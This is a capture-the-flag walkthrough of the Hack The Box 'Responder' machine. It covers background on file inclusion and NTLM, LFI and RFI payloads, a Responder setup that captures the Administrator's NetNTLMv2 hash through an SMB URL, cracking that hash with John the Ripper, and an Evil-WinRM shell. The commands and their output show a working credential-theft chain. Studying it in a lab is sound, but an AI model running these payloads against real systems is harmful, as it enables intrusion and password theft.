#winrm #custom-applications #protocols #xampp #smb #responder #php #reconnaissance #password-cracking #hash-capture #remote-file-inclusion #remote-code-execution

# 0. Theory

Windows is the most predominant operating system in today's world because of its easy-to-use GUI accessibility. About 85% of the market share has become a critical OS to attack. Furthermore, most organizations use Active Directory to set up their Windows domain networks. Microsoft employs **NTLM** (**New Technology LAN Manager**) & **Kerberos** for authentication services. Despite known vulnerabilities, NTLM remains widely deployed even on new systems to maintain compatibility with legacy clients and servers.

### File Inclusion Vulnerability
Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET and POST parameters, cookies, and other variables. It is common for a page to "include" another page based on some of these parameters.

> **LFI** (**Local File Inclusion**) occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the `../` string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

> **RFI** (**Remote File Inclusion**) is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.

### NTLM (New Technology Lan Manager)
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.

It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor only once, at login.

The NTLM authentication process is done in the following way:
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.

[More info on NTLM here.](https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/)

### NTLM vs NTHash vs NetNTMLv2
The terminology around NTLM authentication is messy, and even pros misuse it from time to time.

- A **hash function** is a one-way function that takes any amount of data and returns a fixed size value. Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords more securely, as there's no way to convert the hash directly back to the original data (though there are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a hash of your password, and when you submit your password to the site, it hashes your input, and compares the result to the hash in the database, and if they match, it knows you supplied the correct password.
- An **NTHash** is the output of the algorithm used to store passwords on Windows systems in the SAM database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an NTLM, which is very misleading / confusing.
- When the NTLM protocol wants to do authentication over the network, it uses a challenge / response model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. We'll see NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

### Windows Remote Management** (**WinRM**)
**Windows Remote Management**, (**WinRM**), is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to:
 → Remotely communicate and interface with hosts
 → Execute commands remotely on systems that are not local to you but are network accessible.
 → Monitor, manage and configure servers, operating systems and client machines from a remote location.


**What value for a URL parameter would be an example of exploiting a Local File Include (LFI) vulnerability?**
*`../../../../../../../../windows/system32/drivers/etc/hosts`*

**What value for the URL parameter would be an example of exploiting a Remote File Include (RFI) vulnerability?**
*`//{attacker IP}/somefile` where "somefile" can be absolutely any string*

**New Technology Lan Manager**
*New Technology Lan Manager*

**Which flag do we use in the Responder utility to specify the network interface?**
*`-I`*

**There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?**
*john the ripper*

**We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?**
*5985*


# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~]
	└──╼ [★]$ ping 10.129.46.160 -c 4
	PING 10.129.46.160 (10.129.46.160) 56(84) bytes of data.
	64 bytes from 10.129.46.160: icmp_seq=1 ttl=127 time=8.21 ms
	64 bytes from 10.129.46.160: icmp_seq=2 ttl=127 time=8.53 ms
	64 bytes from 10.129.46.160: icmp_seq=3 ttl=127 time=8.62 ms
	64 bytes from 10.129.46.160: icmp_seq=4 ttl=127 time=8.43 ms
	
	--- 10.129.46.160 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3004ms
	rtt min/avg/max/mdev = 8.212/8.447/8.620/0.151 ms

# 2. Enumeration

For port scanning,, we use the following flags for `nmap`:

	-p- : This flag scans for all TCP ports ranging from 0-65535
	-sV : Attempts to determine the version of the service running on a port
	--min-rate : This is used to specify the minimum number of packets Nmap should send per second; it speeds up the scan as the number goes higher

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~]
	└──╼ [★]$ nmap -p- -sV --min-rate 1000 10.129.46.160
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 13:23 CDT
	Nmap scan report for 10.129.46.160
	Host is up (0.0079s latency).
	Not shown: 65533 filtered tcp ports (no-response)
	PORT     STATE SERVICE VERSION
	80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
	5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 107.64 seconds


> How does Nmap determine the service running on the port?
>
>Nmap uses a port-services database of well-known services in order to determine the service running on a particular port. It later also sends some service-specific requests to that port to determine the service version & any additional information about it. Thus, Nmap is mostly but not always correct about the service info for a particular port.


According to the results of the Nmap scan, the machine is using Windows as its operating system.
Two ports were detected as open having Apache web server running on **port 80** along with WinRM on **port 5985**.

As a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host

## Website Enumeration

When we try to navigate to the target IP in the browser, it returns a message about being unable to find that site. Looking in the URL bar, it now shows `http://unika.htb` . The website has redirected the browser to a new URL, and your host doesn't know how to find `unika.htb` . This webserver is employing **name-based** Virtual Hosting for serving the requests.
![[Pasted image 20240830203209.png]]

> **Name-Based Virtual hosting** is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.

The `/etc/hosts` file is used to resolve a hostname into an IP address & thus we will need to add an entry in the `/etc/hosts` file for this domain to enable the browser to resolve the address for `unika.htb` .
Entry in the `/etc/hosts` file:

	echo "10.129.46.160    unika.htb" | sudo tee -a /etc/hosts

Adding this entry in the `/etc/hosts` file will enable the browser to resolve the hostname `unika.htb` to the corresponding IP address and to make the browser include the HTTP header `Host: unika.htb` in every HTTP request that the browser sends to this IP address, which will make the server respond with the webpage for `unika.htb`.

![[Pasted image 20240830204422.png]]

Checking the site out, we see nothing of particular interest. Although, we notice a language selection option on the navbar EN and changing the option to FR takes us to a French version of the website.

Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a **Local File Inclusion** (**LFI**) vulnerability if the page input is not sanitized.

We test the `page` parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found [here](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).
One of the most common files that a penetration tester might attempt to access on a Windows machine **to verify LFI** is the hosts file, `WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP addresses).
The` ../` string is used to traverse back a directory, one at a time. So, multiple `../` strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. `C:\ `.

`http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

>**What is the `include()` method in PHP?**
>The `include` statement takes all the text/code/markup that exists in the specified file and loads it into the memory, making it available for use. It serves just like `import` does in other languages.


# 3. Foothold

We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.

## Using Responder

In the PHP configuration file `php.ini` , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if `allow_url_include` and `allow_url_fopen` are set to "Off", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.

Now, using the example from [this link](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds) we can attempt to load a SMB URL, and in that process, we can capture the hashes from the target using [Responder](https://github.com/lgandx/Responder).

Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challengeresponse, and if we find one, we know that is the password. This is often referred to as hash cracking, which we'll do with a program called John The Ripper.

If Responder is not installed on the machine already, we can clone the Responder repository to our local machine.

	git clone https://github.com/lgandx/Responder

Verify that the `Responder.conf` is set to listen for SMB requests.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~/Responder]
	└──╼ [★]$ cat Responder.conf
	[Responder Core]
	
	; Poisoners to start
	MDNS  = On
	LLMNR = On
	NBTNS = On
	
	; Servers to start
	SQL      = On
	SMB      = On
	<SNIP>

With the configuration file ready, we can proceed to start Responder with python3 , passing in the interface to listen on using the `-I` flag.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~/Responder]
	└──╼ [★]$ sudo python3 Responder.py -I tun0
	                                         __
	  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
	  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
	                   |__|
	
	           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
	
	  To support this project:
	  Github -> https://github.com/sponsors/lgandx
	  Paypal  -> https://paypal.me/PythonResponder
	
	  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	  To kill this script hit CTRL-C
	
	
	[+] Poisoners:
	    LLMNR                      [ON]
	    NBT-NS                     [ON]
	    MDNS                       [ON]
	    DNS                        [ON]
	    DHCP                       [OFF]
	
	[+] Servers:
	    HTTP server                [ON]
	    HTTPS server               [ON]
	    WPAD proxy                 [OFF]
	    Auth proxy                 [OFF]
	    SMB server                 [ON]
	    <SNIP>

With the Responder server ready, we tell the server to include a resource from our SMB server by setting the `page` parameter as follows via the web browser.

	http://unika.htb/?page=//10.10.14.25/somefile

In this case, because we have the freedom to specify the address for the SMB share, we specify the IP address of our attacking machine. Now the server tries to load the resource from our SMB server, and Responder captures enough of that to get the NetNTLMv2. 

Note: Make sure we add `http://` in the address as some browsers might opt for a Google search instead of navigating to the appropriate page.

After sending our payload through the web browser we get an error about not being able to load the requested file.
![[Pasted image 20240830213026.png]]

But when we check our listening Responder server, we can see we have a NetNTLMv for the Administrator user.

	[SMB] NTLMv2-SSP Client   : 10.129.46.160
	[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
	[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:73ed812d4ec20c3a:9CADB19013C58EAD153F641CCB46C4C2:010100000000000080484A87E8FADA01D205D328185C809600000000020008004E004B003300300001001E00570049004E002D004F004B0044004F0051004F003900470058003900550004003400570049004E002D004F004B0044004F0051004F00390047005800390055002E004E004B00330030002E004C004F00430041004C00030014004E004B00330030002E004C004F00430041004C00050014004E004B00330030002E004C004F00430041004C000700080080484A87E8FADA01060004000200000008003000300000000000000001000000002000005ADD4C246EAB5B8A82C0A5E9ABD345C2CE023CCCA4DE46F4A917B24724DB98830A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320036000000000000000000

The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

## Hash Cracking

We can dump the hash into a file and attempt to crack it with john , which is a password hash-cracking utility.

	echo "Administrator::DESKTOPH3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D801 F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E0048004500380044 0049003400410053004300510004003400570049004E002D004E00480045003800440049003400410053004300 51002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F00430041 004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D801060004000200 000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F 356D47C324C6D6D16F0A001000000000000000000000000000000000000900200063006900660073002F003100 30002E00310030002E00310034002E00320035000000000000000000" > hash.txt

We then pass the hash file to `john` and crack the password for the Administrator account. The hash type is automatically identified by the `john` command-line tool.

	-w : wordlist to use for cracking the hash

	john -w=/usr/share/wordlists/rockyou.txt hash.txt

Execute `sudo gzip -d rockyou.txt.gz` in `/usr/share/wordlists/` to decompress the wordlist file first.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~]
	└──╼ [★]$ john -w=/usr/share/wordlists/rockyou.txt hash.txt 
	Using default input encoding: UTF-8
	Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	badminton        (Administrator)     
	1g 0:00:00:00 DONE (2024-08-30 14:38) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
	Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
	Session completed.

`john` will try each password from the given password list, encrypting the challenge with that password. If the result matches the response, then it knows it found the correct password. In this case, the password of the Administrator account has been successfully cracked.

	password : badminton

## WinRM

We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed on Linux by default, we'll use a tool called [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) which is made for this kind of scenario.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-w9iqw2ilnu]─[~]
	└──╼ [★]$ evil-winrm -i 10.129.46.160 -u administrator -p badminton
	                                        
	Evil-WinRM shell v3.5
	                                        
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	                                        
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	                                        
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\Administrator\Documents>

We can sniff around on the host until we find the flag.

	*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
	*Evil-WinRM* PS C:\Users\Administrator> cd ..
	*Evil-WinRM* PS C:\Users> dir
	
	
	    Directory: C:\Users
	
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	d-----          3/9/2022   5:35 PM                Administrator
	d-----          3/9/2022   5:33 PM                mike
	d-r---        10/10/2020  12:37 PM                Public
	
	
	*Evil-WinRM* PS C:\Users> cd mike
	*Evil-WinRM* PS C:\Users\mike> dir
	
	
	    Directory: C:\Users\mike
	
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	d-----         3/10/2022   4:51 AM                Desktop
	
	
	*Evil-WinRM* PS C:\Users\mike> cd Desktop
	*Evil-WinRM* PS C:\Users\mike\Desktop> dir
	
	
	    Directory: C:\Users\mike\Desktop
	
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         3/10/2022   4:50 AM             32 flag.txt
	
	
	*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
	ea81b7afddd03efaa0945333ed147fac



https://www.hackthebox.com/achievement/machine/2057492/461
![[Pasted image 20240830215614.png]]